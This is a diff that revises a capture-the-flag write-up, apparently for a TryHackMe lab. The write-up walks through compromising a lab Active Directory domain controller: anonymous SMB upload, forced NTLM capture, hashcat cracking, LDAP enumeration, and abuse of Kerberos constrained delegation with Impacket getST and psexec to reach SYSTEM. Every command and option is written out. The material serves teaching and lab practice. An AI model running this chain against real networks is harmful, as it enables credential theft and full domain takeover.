@@ -29,7 +29,6 @@ tools:
   - impacket-getST
   - impacket-psexec
 ---
-
 **Attack path:** Anonymous writable SMB share → `svc.scanner` forced NTLM authentication → NetNTLMv2 cracking → authenticated LDAP enumeration → Kerberos Constrained Delegation → Administrator CIFS ticket → PsExec → SYSTEM
 
 ## 1. Active Directory Reconnaissance
@@ -86,31 +85,40 @@ Using the correct hostname is particularly important later because Kerberos tick
 
 ## 2. Anonymous LDAP and RPC Enumeration
 
-The LDAP RootDSE was queried first:
+The **Lightweight Directory Access Protocol** RootDSE was queried first:
 
 ```bash
 ldapsearch -x \
   -H ldap://DC01.ctf.local \
   -s base \
   namingContexts
+
+Options:
+ldapsearch                 command-line tool used to query an LDAP directory
+-x                         use simple authentication instead of SASL
+-H ldap://DC01.ctf.local   connect to the LDAP service on the Domain Controller
+-s base                    search only the base/root LDAP entry
+namingContexts             request the namingContexts attribute
 ```
 
 Relevant result:
 
 ```bash
 namingContexts: DC=ctf,DC=local
+
+This established the domain Base DN: DC=ctf,DC=local
 ```
 
-This established the domain Base DN:
-
-```bash
-DC=ctf,DC=local
-```
-
-An anonymous RPC session was also tested:
+An anonymous **Remote Procedure Call** session was also tested:
 
 ```bash
 rpcclient -U "" -N DC01.ctf.local
+
+Options:
+rpcclient              command-line client used to interact with Windows RPC services
+-U ""                  use an empty username for an anonymous session
+-N                     do not prompt for a password
+DC01.ctf.local         target Domain Controller
 ```
 
 User and group enumeration was attempted:
@@ -118,11 +126,8 @@ User and group enumeration was attempted:
 ```bash
 enumdomusers
 enumdomgroups
-```
 
 but returned:
-
-```bash
 NT_STATUS_ACCESS_DENIED
 ```
 
@@ -233,13 +238,9 @@ It was uploaded through the anonymous SMB session:
 
 ```bash
 smbclient //DC01.ctf.local/IT-Shared -N
-```
 
-```bash
 smb: \> put /tmp/test.txt test.txt
 ```
-
-The upload succeeded.
 
 The share therefore allowed:
 
@@ -290,11 +291,7 @@ The local Samba service was already occupying TCP port `445`:
 
 ```bash
 smbd
-```
 
-It was stopped:
-
-```bash
 systemctl stop smbd
 ```
 
@@ -308,9 +305,7 @@ The trigger file was uploaded to the writable share:
 
 ```bash
 smbclient //DC01.ctf.local/IT-Shared -N
-```
 
-```bash
 smb: \> put trigger.ps1 trigger.ps1
 smb: \> exit
 ```
@@ -350,16 +345,12 @@ It was not the plaintext password and was not the account's NT hash directly.
 The captured NetNTLMv2 response was stored in `hash.txt` and attacked offline:
 
 ```bash
-hashcat -m 5600 \
-  hash.txt \
-  /usr/share/wordlists/rockyou.txt
-```
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 
-Hashcat mode `5600` corresponds to NetNTLMv2.
+Options:
+-m 5600  corresponds to NetNTLMv2.
 
-The password was successfully recovered:
-
-```bash
+Result:
 Username: svc.scanner
 Password: <REDACTED>
 ```
@@ -376,6 +367,14 @@ The recovered credential was then validated against SMB:
 nxc smb DC01.ctf.local \
   -u 'svc.scanner' \
   -p '<REDACTED>'
+
+Options:
+nxc smb                 use NetExec against the SMB service
+DC01.ctf.local          target Domain Controller
+-u 'svc.scanner'        username used for authentication
+-p '<REDACTED>'         password used for authentication
+
+NetExec (`nxc`) is a network enumeration and exploitation tool commonly used against Windows and Active Directory environments. It supports protocols such as SMB, LDAP, WinRM, RDP, and MSSQL, and is often used to validate credentials, enumerate hosts, and identify accessible services.
 ```
 
 Authentication succeeded:
@@ -400,6 +399,20 @@ ldapsearch -x \
   -b 'DC=ctf,DC=local' \
   '(sAMAccountName=svc.scanner)' \
   sAMAccountName memberOf userAccountControl servicePrincipalName msDS-AllowedToDelegateTo
+
+Options:
+ldapsearch                         command-line tool used to query an LDAP directory
+-x                                 use simple authentication instead of SASL
+-H ldap://DC01.ctf.local           connect to the LDAP service on the Domain Controller
+-D 'svc.scanner@ctf.local'         bind/authenticate as the svc.scanner account
+-w '<REDACTED>'                    password used for LDAP authentication
+-b 'DC=ctf,DC=local'               Base DN from which the LDAP search starts
+'(sAMAccountName=svc.scanner)'     filter the search to the svc.scanner account
+sAMAccountName                     return the account's logon name
+memberOf                           return the groups the account belongs to
+userAccountControl                 return Windows account-control flags
+servicePrincipalName               return SPNs associated with the account
+msDS-AllowedToDelegateTo           return services to which the account may delegate
 ```
 
 Relevant attributes included:
@@ -418,7 +431,7 @@ The critical discovery was:
 msDS-AllowedToDelegateTo: cifs/DC01.ctf.local
 ```
 
-This showed that `svc.scanner` was configured for **Kerberos Constrained Delegation** to the CIFS service on the Domain Controller.
+This showed that `svc.scanner` was configured for **Kerberos Constrained Delegation** to the Common Internet File System (CFIS) service on the Domain Controller.
 
 ---
 
@@ -493,6 +506,13 @@ getST.py \
   -spn cifs/DC01.ctf.local \
   -impersonate Administrator \
   'ctf.local/svc.scanner:<REDACTED>'
+
+Options:
+getST.py                         Impacket tool used to request Kerberos service tickets
+-dc-ip <TARGET_IP>               IP address of the Domain Controller / KDC
+-spn cifs/DC01.ctf.local         request a ticket for the CIFS service on DC01
+-impersonate Administrator       request the ticket on behalf of Administrator
+ctf.local/svc.scanner:<PASSWORD> authenticate using the svc.scanner domain account
 ```
 
 Relevant output:
@@ -528,41 +548,23 @@ The obtained CIFS ticket was then used with Impacket's PsExec implementation:
 
 ```bash
 psexec.py -k -no-pass 'ctf.local/Administrator@DC01.ctf.local'
+
+Options:
+psexec.py                         Impacket tool used for remote command execution over SMB
+-k                                use Kerberos authentication
+-no-pass                          do not prompt for a password; use the existing Kerberos ticket cache
+ctf.local/Administrator           authenticate as the Administrator account in the ctf.local domain
+@DC01.ctf.local                   target the Domain Controller by hostname
 ```
 
-The options instructed PsExec to use Kerberos and the existing ticket cache rather than requesting a password.
-
-The hostname mattered here.
-
-The ticket had been issued for:
-
-```bash
-cifs/DC01.ctf.local
-```
-
-so the target was addressed as:
-
-```bash
-DC01.ctf.local
-```
-
-rather than only by IP address.
-
-The remote execution succeeded, resulting in a highly privileged shell on the Domain Controller.
+The options instructed PsExec to use Kerberos and the existing ticket cache rather than requesting a password. The hostname mattered here. The ticket had been issued for `cifs/DC01.ctf.local` so the target was addressed as `DC01.ctf.local` rather than only by IP address.
 
 The execution context was:
 
 ```bash
 NT AUTHORITY\SYSTEM
-```
 
-The final flag could then be retrieved:
-
-```cmd
 type C:\Users\Administrator\Desktop\flag.txt
-```
-
-```bash
 THM{REDACTED}
 ```
 
